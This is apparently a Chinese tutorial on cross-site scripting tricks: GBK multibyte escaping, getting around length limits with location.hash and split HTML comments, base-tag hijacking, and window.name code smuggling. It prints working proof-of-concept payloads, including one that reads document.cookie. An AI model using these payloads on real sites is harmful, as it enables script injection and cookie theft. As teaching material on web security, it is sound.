### 利用字符编码
百度搜索曾经出现过一个这样的XSS漏洞。一个`<script>`标签中输出了一个变量，其中转义了双引号
```js
var redirectUrl = "\";alert(/XSS/);";
```
由于变量处于双引号之类，系统转义了双引号导致变量无法`escape`
但是由于返回的页面是`GBK/GB2312`编码的,因此`%c1\`这两个字符组合在一起后，就会成为一个Unicode字符。在FireFox下会认为这是一个字符，所以构造
```
%c1";alert(/XSS/);
```
这两个字节`%c1\`组成了一个新的Unicode字符，从而绕过了系统安全检查，成功实施了XSS攻击

### 绕过长度限制
很多时候，产生XSS的地方会有变量长度的限制
```js
<input type="text" value="$val" />
```
现在如果攻击者构造这样的XSS
```
$var的值  "><script>alert(/XSS/)</script>
```
考虑到输入长度的限制，一个最常用的藏代码的地方就是`location.hash`。而且根据HTTP协议，`location.hash`的内容不会在HTTP包中发送，所以服务端的web日志中不会记录location.hash的内容，从而更好的隐藏了黑客真是的意图
```
$var输出为     " onclick="eval(location.hash.substr(1))
```
此时构造XSS的URL为
```
http://www.a.com/test.html#alert(1)
```
如果地址栏的长度不够用，还可以加载远程的JS文件，来执行更多代码
利用注释绕过长度限制
```
<input type="text" id="1" value="" />
xxxxxxxxxx
<input type="text" id="2" value="" />
```
第一个input中输入`"><!--`,第二个input中输入`--><script>alert(/XSS/)</script>`
最终的效果是
```
<input type="text" id="1" value=""><!--" />
xxxx
<input type="text" id="2" value="--><script>alert(/XSS/)</script>" />
```

### 使用<base>标签
`<base>`标签并不常用，他的作用是定义页面上所有的相对路径标签的`hosting`地址
比如打开一张不存在的图片
```html
<img src="/int1/en_all/images/a.png" />
```
需要特别注意的是，在有的技术文档中，提到<base>标签只能用于head标签之内，其实这是不对的，<base>可以出现在页面的任何地方，并作用于该标签之后的所有标签
攻击者如果在页面中插入了<base>标签，就可以在远程服务器上伪造图片链接脚本，劫持当前页面中的所有使用相对路径的标签

### window.name
对当前的window.name对象是一个很神奇的东西。对当前窗口的`window.name`对象赋值，没有特殊的字符显示。因为window对象是浏览器的窗体，并非`document`对象，因此很多时候window对象不受同源策略的限制
```js
window.name = 'test';
alert(document.domain + ' ' + window.name);
window.location = 'http://www.b.com/test1.html';
```
这段代码显示当前域和window.name的值，最后将页面调到`http://www.b.com/test1.html`
`www.c.com/test1.html`的代码为
```js
alert(document.domain + ' ' + window.name);
```
这个过程就可以实现跨域传递`test`
如果跨域劫持cookie
```js
window.name = "alert(document.cookie)";
location.href = 'http://www.xssedsite.com/xssed.php';
```
在同一窗口打开XSS站点后，只需要通过XSS执行一下代码即可
```js
eval(window.name);
```